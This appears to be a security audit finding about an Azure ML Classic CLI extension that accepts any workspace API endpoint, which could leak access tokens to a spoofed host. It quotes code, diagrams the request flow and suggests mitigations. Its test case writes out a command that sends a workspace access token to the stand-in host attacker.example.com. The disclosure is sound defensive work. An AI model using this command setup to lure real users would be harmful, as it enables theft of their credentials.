### 1. Man-in-the-Middle Vulnerability via Workspace API Endpoint Spoofing

- Description:
    1. The Azure CLI extension for ML Classic assessment allows users to specify the workspace API endpoint using the `--workspace-api-endpoint` or `-wapi` parameter.
    2. An attacker could potentially trick a user into using a malicious API endpoint URL instead of the legitimate Azure ML Classic API endpoint.
    3. If a user is misled into using a malicious endpoint, all subsequent API requests made by the CLI extension, including requests containing the user's workspace access token and workspace data, will be directed to the attacker-controlled endpoint.
    4. The attacker can then intercept and log these requests, potentially gaining unauthorized access to the user's Azure ML Classic workspace access token and sensitive information about their ML Classic assets.

- Impact:
    - **High**: If exploited, this vulnerability could allow an attacker to steal Azure ML Classic workspace access tokens and sensitive information about a user's Machine Learning Studio (classic) assets. This could lead to unauthorized access to the user's Azure ML Classic environment, potential data breaches, and unauthorized modifications or deletion of ML assets.

- Vulnerability Rank: High

- Currently Implemented Mitigations:
    - None: The tool currently accepts the workspace API endpoint as a user-provided parameter without any validation or warning about potential security risks.

- Missing Mitigations:
    - **Input Validation and Warning**: The tool should validate the format of the provided workspace API endpoint to ensure it resembles a legitimate Azure ML API endpoint. Additionally, a security warning should be displayed to the user when a custom workspace API endpoint is provided, advising them to only use trusted endpoints and be cautious of potential spoofing attacks.
    - **Documentation Enhancement**: The documentation should explicitly mention the security implications of using a custom workspace API endpoint and advise users against using untrusted or unknown endpoints.

- Preconditions:
    - The attacker needs to trick the user into running the Azure CLI extension with a malicious `--workspace-api-endpoint` parameter. This could be achieved through social engineering, phishing, or by compromising a system where the user is likely to copy commands from.
    - The user must have an Azure account with permissions to access ML Classic workspaces and be willing to use the provided Azure CLI extension.

- Source Code Analysis:
    1. **File: `/code/automated_assessment/azext_mlclassicextension/api_client.py`**:
        - The `APIClient` class constructor takes `api_endpoint` as an argument and stores it in `self.__api_url`.
        - The `__send_get_req` and `__send_management_get_req` methods use `urljoin(self.__api_url, api_path)` to construct the full API URL. This means the base URL is directly taken from the `api_endpoint` provided during `APIClient` instantiation.

        ```python
        class APIClient(object):
            def __init__(self, location, api_endpoint, access_token, trace=False):
                # ...
                self.__api_url = api_endpoint
                # ...
            def __send_get_req(self, api_path):
                url = urljoin(self.__api_url, api_path) # API URL is constructed using user-provided api_endpoint
                # ...
                response = requests.get(url=url, headers=self.__get_headers())
                # ...
        ```

    2. **File: `/code/automated_assessment/azext_mlclassicextension/workspace.py`**:
        - The `MLClassicWorkspace` class constructor takes `api_endpoint` as an argument and passes it directly to the `APIClient` constructor.

        ```python
        class MLClassicWorkspace(object):
            def __init__(self, workspace_id, azure_location, api_endpoint, access_token, trace=False):
                # ...
                self.__api_endpoint = api_endpoint
                # ...
                self.__api = APIClient(self.__ml_classic_location, api_endpoint, access_token, trace=trace) # api_endpoint passed to APIClient
                # ...
        ```

    3. **File: `/code/automated_assessment/azext_mlclassicextension/__init__.py`**:
        - The CLI command functions like `show_workspace` take `workspace_api_endpoint` as an argument and pass it to the `MLClassicWorkspace` constructor.

        ```python
        def show_workspace(workspace_id, workspace_location, workspace_api_endpoint,  workspace_access_token):
            ws = MLClassicWorkspace(workspace_id, workspace_location, workspace_api_endpoint,  workspace_access_token) # api_endpoint passed to MLClassicWorkspace
            return ws.get_details()
        ```

    4. **File: `/code/automated_assessment/azext_mlclassicextension/__init__.py` & `/code/automated_assessment/azext_mlclassicextension/commands.py` (inferred, as commands.py is typical for az extensions)**:
        - The `MLClassicCommandsLoader.load_arguments` function defines `workspace_api_endpoint` as a command argument, allowing users to specify it when running the CLI command.

        ```python
        class MLClassicCommandsLoader(AzCommandsLoader):
            # ...
            def load_arguments(self, _):
                with self.argument_context('mlclassic workspace') as c:
                    c.argument('workspace_api_endpoint', options_list=['-wapi', '--workspace-api-endpoint'], type=str, help='The API endpoint servicing the Azure ML Classic workspace.') # User can provide workspace_api_endpoint via CLI
                # ...
        ```

    **Visualization:**

    ```
    User (CLI) -->  az mlclassic workspace show --wapi <malicious_endpoint> ...
                      |
                      V
    CLI Extension (__init__.py) --> show_workspace(workspace_api_endpoint=<malicious_endpoint>, ...)
                                        |
                                        V
    MLClassicWorkspace (workspace.py) --> APIClient(api_endpoint=<malicious_endpoint>, ...)
                                              |
                                              V
    APIClient (api_client.py) --------> requests.get(url=urljoin(<malicious_endpoint>, api_path), ...)
                                                      |
                                                      V
    Attacker Server (malicious_endpoint) <-- Receives API request with Access Token and Workspace Data
    ```

- Security Test Case:
    1. **Setup Attacker Server:** Create a simple HTTP server (e.g., using Python `http.server`) that listens on a public IP address and logs all incoming requests, including headers and request paths. Let's say the attacker server is running on `http://attacker.example.com:8080`.
    2. **Prepare Malicious API Endpoint URL:** Construct a malicious API endpoint URL pointing to the attacker server. For example: `http://attacker.example.com:8080/api/`.  Note: `/api/` is appended to mimic the expected path structure.
    3. **Run Azure CLI Extension with Malicious Endpoint:** Execute an Azure CLI command from the `mlclassic` extension, providing the malicious API endpoint URL using the `--workspace-api-endpoint` parameter. For example:
       ```bash
       az mlclassic workspace show --workspace-id <your_workspace_id> --workspace-location <your_workspace_location> --workspace-api-endpoint http://attacker.example.com:8080/api/ --workspace-access-token <your_workspace_access_token>
       ```
       Replace `<your_workspace_id>`, `<your_workspace_location>`, and `<your_workspace_access_token>` with valid values for your Azure ML Classic workspace.
    4. **Inspect Attacker Server Logs:** Check the logs of the attacker's HTTP server. If the vulnerability is present, you should see logs of HTTP requests received by the attacker server. These requests will include headers, potentially containing the `x-ms-metaanalytics-authorizationtoken` (access token) and the paths of API calls made by the CLI extension.
    5. **Verify Data Interception:** Analyze the intercepted requests to confirm that sensitive information, such as the access token and details about the Azure ML Classic workspace, is being sent to the attacker-controlled endpoint.

This test case demonstrates that by providing a malicious `--workspace-api-endpoint`, an attacker can intercept API requests and potentially steal sensitive information, confirming the Man-in-the-Middle vulnerability.
